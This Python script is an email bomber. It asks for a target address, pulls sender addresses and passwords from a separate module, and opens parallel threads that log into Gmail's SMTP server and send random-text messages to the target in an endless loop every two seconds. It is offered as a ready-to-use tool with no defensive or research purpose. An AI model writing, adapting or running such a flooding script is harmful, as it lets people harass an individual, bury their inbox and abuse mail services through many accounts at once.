from email.message import EmailMessage
import info
import ssl
import smtplib
import random
import string
import time
import threading

amount = 0

sender = info.emails
password = info.passwords

reciever = str(input("who:"))

context = ssl.create_default_context()

def RandomString(length):
    AASCII_letters = string.ascii_lowercase
    result = ""
    for i in range(length):
        result += random.choice(AASCII_letters)
    return result

def GenerateMessage(sender, reciever, subject, body):
    em = EmailMessage()
    em['From'] = sender
    em['To'] = reciever
    em['Subject'] = subject
    em.set_content(body)
    return em

def SendEmail(sender, password, reciever):
    global amount
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as smtp:
        smtp.login(sender, password)
        smtp.sendmail(sender, reciever, GenerateMessage(sender, reciever, RandomString(69), RandomString(1000)).as_string())
        amount += 1
        print(amount)
while True:
    #create the threads
    threadlist = []
    for i in range(len(sender)):
        threadlist.append(threading.Thread(target=SendEmail, args=(sender[i], password[i], reciever)))
    for thread in threadlist:
        thread.start()
    for thread in threadlist:
        thread.join()
    time.sleep(2)
